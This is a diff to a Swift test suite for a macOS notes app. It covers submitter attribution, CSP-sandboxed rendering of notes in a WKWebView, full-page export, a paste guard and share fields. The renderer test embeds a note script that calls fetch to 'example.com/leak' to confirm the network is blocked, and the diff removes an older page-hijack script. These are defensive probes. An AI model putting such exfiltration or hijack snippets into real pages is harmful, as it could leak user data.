@@ -41,6 +41,34 @@ let noFraction = Note(id: "1", title: "t", folderName: nil, folderColor: nil,
 T.check("displayDate parses a timestamp with no fractional seconds",
         noFraction.displayDate != "2026-09-08T10:13:00Z" && !noFraction.displayDate.isEmpty)
 
+// MARK: - Submitter: the name the top-right chip and the footer show
+
+let fromLaptop = Note(id: "1", title: "t", folderName: nil, folderColor: nil,
+                      updatedAt: nil, createdAt: "2026-09-17T14:32:58Z", type: nil, content: nil, icon: nil,
+                      createdByKey: "GV741W2732", createdByMachine: "GV741W2732")
+T.equal("laptop notes are named by hostname", fromLaptop.submitterName, "GV741W2732")
+let fromBrowser = Note(id: "1", title: "t", folderName: nil, folderColor: nil,
+                       updatedAt: nil, createdAt: nil, type: nil, content: nil, icon: nil,
+                       createdByKey: "stickies", createdByMachine: "10.0.0.9")
+T.equal("the owner's own browser is \"me\"", fromBrowser.submitterName, "me")
+T.equal("no attribution at all is still \"me\"", noDates.submitterName, "me")
+let fromApp = Note(id: "1", title: "t", folderName: nil, folderColor: nil,
+                   updatedAt: nil, createdAt: nil, type: nil, content: nil, icon: nil,
+                   createdByKey: "automations-pipeline", createdByMachine: "M4")
+T.equal("an app is named by its key", fromApp.submitterName, "automations-pipeline")
+let fromHub = Note(id: "1", title: "t", folderName: nil, folderColor: nil,
+                   updatedAt: nil, createdAt: nil, type: nil, content: nil, icon: nil,
+                   createdByKey: "M4", createdByMachine: "M4")
+T.check("the hub posting as itself shows the Mac mini, not the Stickies icon",
+        fromHub.submitterIconURLs.first?.path.hasSuffix("/machines/mac-mini-front.png") == true)
+T.check("an app on the hub keeps its own icon first",
+        fromApp.submitterIconURLs.first?.path.hasSuffix("/app-icons/automations-pipeline.png") == true)
+T.check("and falls back to the Mac mini, not Stickies, when that icon is missing",
+        fromApp.submitterIconURLs.last?.path.hasSuffix("/machines/mac-mini-front.png") == true)
+T.check("createdStamp carries a day and a time", fromLaptop.createdStamp.contains("\u{00B7}"))
+T.check("createdAgo reads as relative", (fromLaptop.createdAgo ?? "").contains("ago"))
+T.equal("createdAgo is nil without a timestamp", noDates.createdAgo, nil)
+
 // MARK: - Folder colour parsing
 
 func coloured(_ hex: String?) -> Note {
@@ -105,11 +133,12 @@ T.equal("an unknown token falls back", NoteIcon.symbol(for: "__hero:NotARealIcon
 T.equal("a nil token falls back", NoteIcon.symbol(for: nil), "doc.text.fill")
 T.equal("a non-prefixed token falls back", NoteIcon.symbol(for: "plain"), "doc.text.fill")
 
-// MARK: - Renderer: CSP must block note scripts, the highlighter must still run
+// MARK: - Renderer: a note may draw, but it may not phone home
 //
-// This is the test that matters most. The find highlighter runs in an isolated
-// content world so a CSP can block every script a note carries. If either half
-// breaks - CSP too weak, or the isolated world blocked too - this catches it.
+// The line the app promises: note scripts RUN (reports chart with Chart.js and an
+// inline script, and blocking them left empty boxes), but the network is shut -
+// fetch, XHR and WebSocket all fail. The find highlighter runs in an isolated
+// content world, which no CSP applies to, and must keep working either way.
 
 final class RenderProbe: NSObject, WKNavigationDelegate {
     let web: WKWebView
@@ -133,10 +162,14 @@ final class RenderProbe: NSObject, WKNavigationDelegate {
         }
     }
 
-    func eval(_ js: String) -> Any? {
+    /// `.defaultClient` for anything the highlighter owns, `.page` for what a
+    /// note's OWN script did. They are separate worlds: a page global read from
+    /// the client world is always undefined, so a check written that way passes
+    /// whether the script ran or not.
+    func eval(_ js: String, in world: WKContentWorld = .defaultClient) -> Any? {
         var out: Any?
         var finished = false
-        web.evaluateJavaScript(js, in: nil, in: .defaultClient) { result in
+        web.evaluateJavaScript(js, in: nil, in: world) { result in
             out = try? result.get()
             finished = true
         }
@@ -153,13 +186,18 @@ final class RenderProbe: NSObject, WKNavigationDelegate {
 let noteBody = """
 <p>The spam fix shipped. Spam was the symptom, not the cause.</p>
 <p>More about spam handling here.</p>
-<script>window.__pwned = true; document.body.innerHTML = 'HIJACKED';</script>
-<div onclick="window.__pwned = true">click me</div>
+<script>
+  window.__ran = true;
+  window.__fetchFailed = "pending";
+  try {
+    fetch("https://example.com/leak").then(function(){ window.__fetchFailed = "allowed"; },
+                                           function(){ window.__fetchFailed = "blocked"; });
+  } catch (e) { window.__fetchFailed = "blocked"; }
+</script>
 """
 let doc = """
 <!doctype html><html><head><meta charset="utf-8">
-<meta http-equiv="Content-Security-Policy"
-      content="default-src 'none'; img-src data: https: http:; style-src 'unsafe-inline'; font-src data:">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline' https://cdnjs.cloudflare.com https://cdn.jsdelivr.net; style-src 'unsafe-inline'; img-src data: https: http:; font-src data: https:; connect-src 'none'; form-action 'none'; base-uri 'none'; object-src 'none'">
 </head><body>\(noteBody)</body></html>
 """
 
@@ -167,20 +205,19 @@ let probe = RenderProbe()
 probe.run(doc)
 T.check("the document finished loading", probe.done)
 
-let pwned = probe.eval("String(window.__pwned)") as? String
-T.check("CSP blocked the note's inline script", pwned == "undefined", "window.__pwned = \(pwned ?? "nil")")
+// The whole point of the change: a note's own script is allowed to draw.
+let ran = probe.eval("String(window.__ran)", in: .page) as? String
+T.equal("the note's inline script runs", ran ?? "nil", "true")
 
-let bodyText = probe.eval("document.body.innerText.indexOf('HIJACKED')") as? Int
-T.equal("the note script did not rewrite the document", bodyText ?? -1, -1)
-
-let strippedDoc = doc.replacingOccurrences(of: noteBody, with: HTMLView.stripScripts(noteBody))
-let stripProbe = RenderProbe()
-stripProbe.run(strippedDoc)
-let lingering = stripProbe.eval("document.body.textContent.indexOf('HIJACKED')") as? Int
-T.equal("stripping removes the script source from the DOM entirely", lingering ?? 0, -1)
-let handler = stripProbe.eval("document.querySelector('div').getAttribute('onclick')")
-T.check("stripping removes inline event handlers", handler is NSNull || handler == nil,
-        "onclick = \(String(describing: handler))")
+// And the half that must NOT move: no network out of a note.
+var verdict = probe.eval("String(window.__fetchFailed)", in: .page) as? String
+var waited = 0
+while verdict == "pending" && waited < 40 {
+    RunLoop.current.run(mode: .default, before: Date().addingTimeInterval(0.05))
+    verdict = probe.eval("String(window.__fetchFailed)", in: .page) as? String
+    waited += 1
+}
+T.equal("connect-src none blocks a note's fetch", verdict ?? "nil", "blocked")
 
 let hits = probe.eval("window.__snFind(\"spam\")") as? Int
 T.equal("the highlighter runs despite the CSP and finds every match", hits ?? -1, 3)
@@ -298,5 +335,149 @@ T.equal("stepping does NOT reload the document", evalOnPage("String(window.__pro
 
 T.equal("the highlights survive in the live document",
         evalOnPage("document.querySelectorAll('mark.sn-hit').length") as? Int, 3)
+
+// MARK: - Export: the WHOLE note, not the visible part
+
+// The live view above is 600x400. A note taller than that must still come back
+// whole - this is the one thing a takeSnapshot-based export gets wrong, so it is
+// the thing worth asserting.
+if let web = bridgeHost.view {
+    var tallDone = false
+    web.evaluateJavaScript("document.body.insertAdjacentHTML('beforeend', '<div style=\\'height:2400px\\'>tail</div>'); document.documentElement.scrollHeight",
+                           in: nil, in: .defaultClient) { _ in tallDone = true }
+    _ = pump(until: { tallDone }, timeout: 5)
+    pump(0.5)
+
+    var exported: CGImage?
+    var exportFailed: String?
+    Task { @MainActor in
+        do { exported = try await NoteExport.fullPageImage(of: web, scale: 1) }
+        catch { exportFailed = "\(error)" }
+    }
+    let captured = pump(until: { exported != nil || exportFailed != nil }, timeout: 30)
+    T.check("the full-page export produced an image", captured && exported != nil, exportFailed ?? "timed out")
+
+    if let image = exported {
+        T.check("the export is the whole document, not the 400pt on screen",
+                image.height > 1200, "got \(image.height)pt tall")
+        T.check("the export keeps the rendered width", image.width >= 500, "got \(image.width)pt wide")
+
+        let png = FileManager.default.temporaryDirectory.appendingPathComponent("noto-export-test.png")
+        try? FileManager.default.removeItem(at: png)
+        do {
+            try NoteExport.write(image, to: png, format: .png)
+            let size = ((try? FileManager.default.attributesOfItem(atPath: png.path)[.size]) as? Int) ?? 0
+            T.check("PNG lands on disk with real bytes", size > 2000, "got \(size) bytes")
+        } catch {
+            T.check("PNG lands on disk with real bytes", false, "\(error)")
+        }
+        try? FileManager.default.removeItem(at: png)
+
+        // Only where an encoder exists. The menu hides the option on a Mac without
+        // one, so the suite skips it there too instead of failing.
+        if NoteExport.webpEncoder != nil {
+            let webp = FileManager.default.temporaryDirectory.appendingPathComponent("noto-export-test.webp")
+            try? FileManager.default.removeItem(at: webp)
+            do {
+                try NoteExport.write(image, to: webp, format: .webp)
+                let bytes = (try? Data(contentsOf: webp)) ?? Data()
+                T.check("WebP lands on disk", bytes.count > 1000, "got \(bytes.count) bytes")
+                T.check("WebP carries the RIFF/WEBP header",
+                        bytes.count > 12 && Array(bytes[0..<4]) == Array("RIFF".utf8) && Array(bytes[8..<12]) == Array("WEBP".utf8))
+            } catch {
+                T.check("WebP lands on disk", false, "\(error)")
+            }
+            try? FileManager.default.removeItem(at: webp)
+        }
+    }
+}
+
+// Filenames: a title is free text, a filename is not.
+T.equal("slashes never reach the filename", NoteExport.safeName("a/b:c"), "a b c")
+T.equal("an empty title still saves", NoteExport.safeName("   "), "Note")
+T.equal("a normal title is left alone", NoteExport.safeName("Resource Audit - 12h Rollup"), "Resource Audit - 12h Rollup")
+
+// MARK: - The second paste is refused
+
+func cmdV() -> NSEvent {
+    NSEvent.keyEvent(with: .keyDown, location: .zero, modifierFlags: .command, timestamp: 0,
+                     windowNumber: 0, context: nil, characters: "v", charactersIgnoringModifiers: "v",
+                     isARepeat: false, keyCode: 9)!
+}
+
+let clip = NSPasteboard.general
+clip.clearContents()
+clip.setString("Iframe", forType: .string)
+
+let guarded = GuardedSearchField()
+guarded.stringValue = "Iframe"
+T.check("a paste that repeats the whole field is swallowed", guarded.performKeyEquivalent(with: cmdV()))
+T.equal("the field is left holding one copy", guarded.stringValue, "Iframe")
+
+// Trailing whitespace on either side is still the same paste.
+guarded.stringValue = "Iframe "
+T.check("whitespace does not sneak the repeat through", PasteGuard.blocks(cmdV(), current: guarded.stringValue))
+guarded.stringValue = "iframe"
+T.check("case does not sneak the repeat through", PasteGuard.blocks(cmdV(), current: guarded.stringValue))
+
+// Everything that is a real edit still goes through.
+guarded.stringValue = ""
+T.check("pasting into an empty field is allowed", !PasteGuard.blocks(cmdV(), current: guarded.stringValue))
+guarded.stringValue = "webview"
+T.check("pasting a different word is allowed", !PasteGuard.blocks(cmdV(), current: guarded.stringValue))
+guarded.stringValue = "Iframe Iframe"
+T.check("a field that already differs from the clipboard is allowed",
+        !PasteGuard.blocks(cmdV(), current: guarded.stringValue))
+
+let typed = NSEvent.keyEvent(with: .keyDown, location: .zero, modifierFlags: [], timestamp: 0,
+                             windowNumber: 0, context: nil, characters: "v", charactersIgnoringModifiers: "v",
+                             isARepeat: false, keyCode: 9)!
+T.check("a plain v is not a paste", !PasteGuard.isPaste(typed))
+
+clip.clearContents()
+T.check("an empty clipboard blocks nothing", !PasteGuard.repeats("Iframe", clipboard: nil))
+T.check("blank clipboard text blocks nothing", !PasteGuard.repeats("Iframe", clipboard: "   "))
+
+let filter = GuardedTextField()
+clip.clearContents()
+clip.setString("Resource Audit", forType: .string)
+filter.stringValue = "Resource Audit"
+T.check("the sidebar filter carries the same guard", filter.performKeyEquivalent(with: cmdV()))
+
+// MARK: - Share: the fields the owner path writes
+
+// The server names these columns, not this app - a field spelled wrong here is a
+// share toggle that returns 200 and changes nothing.
+func shareJSON(_ f: ShareFields) -> [String: Any] {
+    let data = try! JSONEncoder().encode(f)
+    return (try! JSONSerialization.jsonObject(with: data)) as! [String: Any]
+}
+var fields = ShareFields(isPublic: true)
+fields.id = "abc"
+var json = shareJSON(fields)
+T.equal("public goes out as is_public", json["is_public"] as? Bool, true)
+T.check("a toggle sends only what it changes", json["locked"] == nil && json["frozen"] == nil)
+
+// Locking implies sharing: the web toggle publishes the note at the same time, and
+// sends the passcode in plaintext for the server to hash.
+json = shareJSON(ShareFields(isPublic: true, locked: true, passcode: "s3cret"))
+T.equal("the passcode goes out as lock_password", json["lock_password"] as? String, "s3cret")
+T.equal("locking publishes at the same time", json["is_public"] as? Bool, true)
+
+// Blank is a real answer, not a missing one - "shared, no gate".
+json = shareJSON(ShareFields(locked: true, passcode: ""))
+T.equal("an empty passcode is still sent", json["lock_password"] as? String, "")
+
+json = shareJSON(ShareFields(frozen: false))
+T.equal("releasing the write-protect sends frozen false", json["frozen"] as? Bool, false)
+T.check("releasing it touches nothing else", json["is_public"] == nil && json["locked"] == nil)
+
+// Share writes must NEVER go to the keyed /ext route: the server strips every
+// share field from an API-key PATCH, so that request would silently do nothing.
+T.equal("share writes use the owner path", Config.ownerPath, "/api/stickies")
+T.check("the owner path is not the keyed one", Config.ownerPath != Config.notesPath)
+// A localhost link is useless to whoever it is sent to.
+T.check("the share link points at the public deployment",
+        Config.shareBaseURL.hasPrefix("https://") && !Config.shareBaseURL.contains("localhost"))
 
 T.report()
